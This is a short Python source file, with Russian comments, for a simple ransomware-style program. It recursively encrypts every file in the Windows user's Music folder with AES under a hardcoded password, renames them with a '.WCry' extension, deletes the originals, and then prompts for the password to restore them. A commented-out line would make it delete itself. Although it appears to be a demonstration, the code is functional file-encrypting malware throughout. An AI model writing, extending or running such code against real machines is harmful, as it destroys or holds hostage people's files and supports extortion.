import pyAesCrypt
import os
import sys


target = os.environ['HOMEDRIVE'] + os.environ['HOMEPATH'] + '\\Music\\'     # путь к папке которую будем шифровать
status = 0  # status - 0 файлы не зашифрованы, 1 -  уже зашифрованы
PASSWORD = '1234'
BUFFER_SIZE = 512 * 1024


def crypt_file(file):
    if str(file[len(str(file))-5:]) == '.WCry':     # пропускаем уже зашифрованные файлы
        pass
    else:
        pyAesCrypt.encryptFile(str(file), str(file) + '.WCry', PASSWORD, BUFFER_SIZE)
        print('file ' + file + ' encrypted')
        os.remove(file)


def crypt_dir(dir):
    for file in os.listdir(dir):
        path = os.path.join(dir, file)
        if os.path.isfile(path):
            crypt_file(path)
        else:
            crypt_dir(path)


def decrypt_file(file):
    if str(file[len(str(file))-5:]) == '.WCry':     # расшифровываем только зашифрованные файлы
        pyAesCrypt.decryptFile(str(file), str(file[0:-5]), PASSWORD, BUFFER_SIZE)
        print('file ' + file + ' decrypted')
        os.remove(file)
    else:
        pass


def decrypt_dir(dir):
    for file in os.listdir(dir):
        path = os.path.join(dir, file)
        if os.path.isfile(path):
            decrypt_file(path)
        else:
            decrypt_dir(path)


while True:
    if status == 0:
        crypt_dir(target)
        status = 1
    elif status == 1:
        pas = input('Files are encrypted, enter the password "' + PASSWORD + '" to decrypt: --> ')
        if pas == '1234':
            decrypt_dir(target)
            status = 0
            break
        else:
            print('Incorrect password, try again...')

# os.remove(sys.argv[0])  # удаляем скрипт
